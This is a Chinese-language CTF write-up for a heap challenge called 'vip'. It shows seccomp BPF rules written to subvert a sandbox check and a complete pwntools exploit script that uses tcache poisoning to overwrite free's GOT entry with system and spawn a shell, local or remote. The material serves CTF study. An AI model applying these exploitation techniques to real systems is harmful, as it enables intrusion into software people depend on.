# vip

环境是`Ubuntu18.04`，libc是`2.27`

漏洞点很明显是在`edit`函数里，但是我们要绕过它的限制，才能输入我们想要输入的值，如果绕过的话后面的利用就极其的简单

然后程序还提供了一个`vip`的函数，然后输入`name`的时候存在溢出，可以覆盖`seccomp`的规则

这里推荐用 [seccomp-tools](https://github.com/david942j/seccomp-tools) 这个工具写规则，太好用了，tql

根据`seccomp-tools`的使用说明，我写了如下规则，
```asm
A = sys_number
A == openat ? next : ok
return ERRNO(0)
ok:
return ALLOW
```
绕过了那个限制，让`fd = open("/dev/urandom", 0);`返回了0，我以为这样就成功了，但是当我执行`system("/bin/sh")`的时候
```c
sh: error while loading shared libraries: /lib/x86_64-linux-gnu/tls/haswell/x86_64/libc.so.6: cannot read file data: Error 9
Done!

1.alloc
2.show
3.free
4.edit
5.exit
6.become vip

```

我发现不能简单的直接让`openat`返回0，这样`shell`也无法起，wtcl，后来看了tree学长的wp，只要限制下`openat`的`filename`参数就好了，orz

然后我就把规则改成了这样

```asm
A = sys_number
A == openat ? next : ok
A = args[1]
A == 0x000000000040207e ? next : ok
return ERRNO(0)
ok:
return ALLOW
```

`disasm`下是这样的

```shell
ruan@ubuntu:/mnt/hgfs/shared/byte/pwn/vip/vip$ seccomp-tools disasm rule
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x03 0x00000101  if (A != openat) goto 0005
 0002: 0x20 0x00 0x00 0x00000018  A = filename # openat(dfd, filename, flags, mode)
 0003: 0x15 0x00 0x01 0x0040207e  if (A != 0x40207e) goto 0005
 0004: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```

最终exp如下

```python
from pwn import *

def cmd(command):
	p.recvuntil("Your choice: ")
	p.sendline(str(command))

def add(idx):
	cmd(1)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	
	
def show(idx):
	cmd(2)
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def dele(idx):
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	
def edit(idx,sz,content):
	cmd(4)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)

def vip(name):
	cmd(6)
	p.recvuntil("tell us your name:")
	p.send(name)

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./vip")
		gdb.attach(p,"b *0x00000000004014A8")
	rule = open('./rule',"rb").read()
	add(0)
	add(1)
	vip("r"*0x20+rule)
	dele(1)
	edit(0,0x68,"/bin/sh\x00"+"A"*0x50+p64(0x61)+p64(elf.got['free']))
	add(1)
	add(2)
	show(2)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols['free']
	info('libc : ' + hex(libc.address))
	edit(2,8,p64(libc.symbols['system']))
	dele(0)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so",checksec=False)
	elf = ELF("./vip",checksec=False)
	main(args['REMOTE'])
```
